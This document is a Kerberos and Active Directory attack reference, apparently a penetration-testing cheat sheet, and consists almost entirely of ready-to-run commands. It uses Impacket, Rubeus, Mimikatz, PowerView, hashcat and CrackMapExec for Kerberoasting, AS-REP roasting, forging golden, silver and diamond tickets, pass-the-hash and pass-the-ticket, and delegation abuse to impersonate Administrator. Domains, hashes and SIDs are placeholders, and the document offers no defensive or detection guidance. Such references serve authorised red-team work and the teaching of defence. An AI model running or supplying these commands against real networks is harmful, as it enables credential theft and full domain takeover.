# Kerberos Attack Reference

Complete reference for Kerberos-based attacks in Active Directory environments.

**MITRE ATT&CK**: T1558

## Kerberoasting (T1558.003)

Extract TGS tickets for offline cracking of service account passwords.

### Impacket GetUserSPNs

```bash
# List Kerberoastable accounts
GetUserSPNs.py corp.local/user:'Password1' -dc-ip 10.10.10.1

# Request TGS tickets (hashcat format)
GetUserSPNs.py corp.local/user:'Password1' -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt

# With NTLM hash (pass-the-hash)
GetUserSPNs.py -hashes :NTLM_HASH corp.local/user -dc-ip 10.10.10.1 -request
```

### Rubeus

```cmd
:: Request all Kerberoastable TGS
Rubeus.exe kerberoast /outfile:tgs_hashes.txt

:: Target specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt

:: Use RC4 downgrade for easier cracking
Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_rc4.txt

:: With alternate credentials
Rubeus.exe kerberoast /creduser:corp.local\user /credpassword:Password1
```

### PowerView

```powershell
# Find Kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request TGS
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File tgs_hashes.txt
```

### Crack TGS

```bash
# hashcat mode 13100 (Kerberos TGS-REP etype 23)
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# hashcat mode 19700 (Kerberos TGS-REP etype 17 — AES128)
hashcat -m 19700 tgs_aes.txt rockyou.txt

# hashcat mode 19600 (Kerberos TGS-REP etype 18 — AES256)
hashcat -m 19600 tgs_aes256.txt rockyou.txt
```

## AS-REP Roasting (T1558.004)

Target accounts with Kerberos pre-authentication disabled.

```bash
# Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat -outputfile asrep_hashes.txt
GetNPUsers.py corp.local/user:'Password1' -request -dc-ip 10.10.10.1

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Crack (hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## Golden Ticket (T1558.001)

Forge a TGT for any user. Requires krbtgt NTLM hash.

```bash
# Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NTLM /ptt

# Impacket ticketer
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-DOMAIN-SID -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_NTLM /user:Administrator /domain:corp.local /sid:S-1-5-21-DOMAIN-SID /ptt
```

## Silver Ticket (T1558.002)

Forge a TGS for a specific service. Requires service account NTLM hash.

```bash
# Mimikatz — CIFS service (file shares)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-DOMAIN-SID /target:dc01.corp.local /service:cifs /rc4:SERVICE_NTLM /ptt

# Common service SPNs
# cifs  — file shares (\\server\share)
# http  — web services
# mssql — SQL Server
# ldap  — LDAP queries
# host  — PSRemoting, scheduled tasks
# wsman — WinRM

# Impacket ticketer
ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-DOMAIN-SID -domain corp.local -spn cifs/dc01.corp.local Administrator
```

## Diamond Ticket

Modify a legitimate TGT instead of forging from scratch. Harder to detect.

```cmd
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:Administrator /domain:corp.local /dc:dc01.corp.local /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

## Pass-the-Hash (T1550.002)

Authenticate using NTLM hash without knowing the plaintext password.

```bash
# Impacket
psexec.py -hashes :NTLM_HASH corp.local/admin@target
wmiexec.py -hashes :NTLM_HASH corp.local/admin@target
smbexec.py -hashes :NTLM_HASH corp.local/admin@target
evil-winrm -i target -u admin -H NTLM_HASH

# Mimikatz
sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLM_HASH /run:cmd.exe

# CrackMapExec
crackmapexec smb target -u admin -H NTLM_HASH -x "whoami"
```

## Pass-the-Ticket (T1550.003)

Use a stolen Kerberos ticket to authenticate.

```cmd
:: Mimikatz — inject ticket
kerberos::ptt ticket.kirbi

:: Rubeus — inject ticket
Rubeus.exe ptt /ticket:base64_ticket

:: Impacket — use ccache
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass corp.local/admin@target
```

## Overpass-the-Hash / Pass-the-Key (T1550.002)

Use NTLM hash or AES key to request a legitimate Kerberos ticket.

```cmd
:: Mimikatz — request TGT with NTLM hash
sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLM_HASH /run:powershell.exe

:: Rubeus — request TGT with AES256 key
Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:AES256_KEY /ptt

:: Rubeus — request TGT with NTLM hash
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:NTLM_HASH /ptt
```

## Unconstrained Delegation (T1134)

Servers trusted for delegation store user TGTs. Compromise server → steal any user's TGT.

```powershell
# Find unconstrained delegation computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Monitor for incoming TGTs (on compromised server)
Rubeus.exe monitor /interval:5 /nowrap

# Coerce authentication (PrinterBug / PetitPotam)
SpoolSample.exe dc01.corp.local compromised-server.corp.local
```

## Constrained Delegation / S4U Abuse

```cmd
:: Request TGS for allowed service via S4U
Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt

:: Protocol transition (S4U2Self + S4U2Proxy)
Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /altservice:ldap /ptt
```

## Resource-Based Constrained Delegation (RBCD)

```powershell
# Add RBCD from a controlled computer account to target
Set-ADComputer target-server -PrincipalsAllowedToDelegateToAccount controlled-computer$
```

```cmd
:: Exploit RBCD
Rubeus.exe s4u /user:controlled-computer$ /rc4:COMPUTER_HASH /impersonateuser:Administrator /msdsspn:cifs/target-server.corp.local /ptt
```
